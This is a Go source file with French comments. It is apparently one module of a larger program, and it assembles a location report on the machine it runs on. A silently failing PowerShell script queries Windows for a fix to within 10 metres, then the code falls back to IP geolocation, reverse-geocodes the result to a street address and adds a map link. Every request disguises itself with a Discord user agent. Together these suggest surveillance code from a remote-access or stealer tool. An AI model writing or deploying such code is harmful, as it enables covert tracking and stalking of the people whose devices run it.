// location.go — géolocalisation : coordonnées précises si Windows les donne,
// adresse postale approchée sinon.
//
// Trois sources, dans cet ordre :
//  1. la position Windows (Windows.Devices.Geolocation) — précise au mètre
//     quand l'utilisateur a autorisé la localisation, souvent refusée sinon ;
//  2. ipinfo.io — ville et coordonnées du FAI, toujours disponible ;
//  3. Nominatim — transforme des coordonnées en adresse lisible.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type geoIP struct {
	IP       string `json:"ip"`
	City     string `json:"city"`
	Region   string `json:"region"`
	Country  string `json:"country"`
	Loc      string `json:"loc"` // "lat,lon"
	Org      string `json:"org"`
	Timezone string `json:"timezone"`
	Postal   string `json:"postal"`
}

// locationReport assemble le rapport de géolocalisation.
func locationReport() string {
	var b strings.Builder

	// 1. Position Windows (peut demander une autorisation ; échec silencieux).
	if lat, lon, acc := windowsLocation(); lat != "" {
		fmt.Fprintf(&b, "position Windows : %s, %s (±%s m)\n", lat, lon, acc)
	}

	// 2. IP publique : ville, FAI, coordonnées.
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, "GET", "https://ipinfo.io/json", nil)
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		if b.Len() == 0 {
			return "erreur géoloc : " + err.Error()
		}
		return b.String() + "réseau : " + err.Error()
	}
	defer resp.Body.Close()

	var g geoIP
	if err := json.NewDecoder(resp.Body).Decode(&g); err != nil {
		return b.String() + "erreur lecture géoloc : " + err.Error()
	}

	latLon := strings.Split(g.Loc, ",")
	lat, lon := "?", "?"
	if len(latLon) == 2 {
		lat, lon = latLon[0], latLon[1]
	}
	fmt.Fprintf(&b, "IP publique : %s\nVille : %s (%s) %s\nFAI : %s\nFuseau : %s\nCoordonnées IP : %s, %s\n",
		g.IP, g.City, g.Postal, g.Country, g.Org, g.Timezone, lat, lon)

	// 3. Adresse postale approchée à partir des coordonnées.
	if addr := reverseGeocode(lat, lon); addr != "" {
		fmt.Fprintf(&b, "Adresse approchée : %s\n", addr)
	}
	fmt.Fprintf(&b, "Carte : https://www.google.com/maps?q=%s,%s", lat, lon)
	return b.String()
}

// windowsLocation interroge l'API de localisation de Windows. Les autorisations
// sont souvent refusées sur un poste : la fonction rend des chaînes vides et
// l'appelant se rabat sur la géolocalisation IP.
func windowsLocation() (string, string, string) {
	script := `
try {
  [void][Windows.Devices.Geolocation.Geolocator,Windows.Devices.Geolocation,ContentType=WindowsRuntime]
  Add-Type -AssemblyName System.Runtime.WindowsRuntime
  $g = New-Object Windows.Devices.Geolocation.Geolocator
  $g.DesiredAccuracyInMeters = 10
  $op = $g.GetGeopositionAsync()
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.IsGenericMethodDefinition -and
    $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation` + "`1" + `'
  } | Select-Object -First 1
  $task = $m.MakeGenericMethod([Windows.Devices.Geolocation.Geoposition]).Invoke($null, @($op))
  [void]$task.Wait(12000)
  $p = $task.Result.Coordinate
  Write-Output ("$($p.Point.Position.Latitude)|$($p.Point.Position.Longitude)|$($p.Accuracy)")
} catch { Write-Output 'FAIL' }`
	out, err := runPSUTF8(script)
	if err != nil || strings.Contains(out, "FAIL") {
		return "", "", ""
	}
	parts := strings.Split(strings.TrimSpace(out), "|")
	if len(parts) != 3 {
		return "", "", ""
	}
	return parts[0], parts[1], parts[2]
}

// reverseGeocode convertit « lat,lon » en adresse lisible via Nominatim
// (OpenStreetMap, gratuit, une requête par appel).
func reverseGeocode(lat, lon string) string {
	if lat == "" || lon == "" || lat == "?" || lon == "?" {
		return ""
	}
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()

	u := "https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&addressdetails=0" +
		"&lat=" + url.QueryEscape(lat) + "&lon=" + url.QueryEscape(lon)
	req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	var r struct {
		DisplayName string `json:"display_name"`
	}
	if json.NewDecoder(resp.Body).Decode(&r) != nil {
		return ""
	}
	return strings.TrimSpace(r.DisplayName)
}
